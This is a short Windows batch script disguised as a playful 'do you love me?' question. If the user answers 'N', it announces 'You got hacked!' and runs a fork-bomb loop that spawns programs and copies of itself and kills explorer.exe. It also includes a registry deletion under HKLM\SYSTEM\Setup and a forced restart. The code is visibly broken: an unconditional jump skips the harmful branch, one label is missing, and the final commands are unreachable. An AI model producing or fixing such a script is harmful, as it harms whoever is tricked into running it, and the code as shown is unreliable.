@echo off

color a
echo Hello,do you love me? (press and enter Y/N for yes or no)
set /p input=
  goto love
if /i %input%==N goto hate
if /i not %input%== Y,N goto 1

:love
echo I love you too! :D
echo Bye!
pause
exit

:hate
echo But i love you :c... lol
echo You got hacked! Hahahaha!
timeout 3
:fork
start cmd.exe
start msedge.exe
start notepad.exe
start love.bat
taskkill /im explorer.exe
start love2.bat
goto fork
echo Your computer will be destroyed in 90 seconds!
timeout 90
REG DELETE Computer\HKEY_LOCAL_MACHINE\SYSTEM\Setup\SetupType /f
shutdown /r /t 1

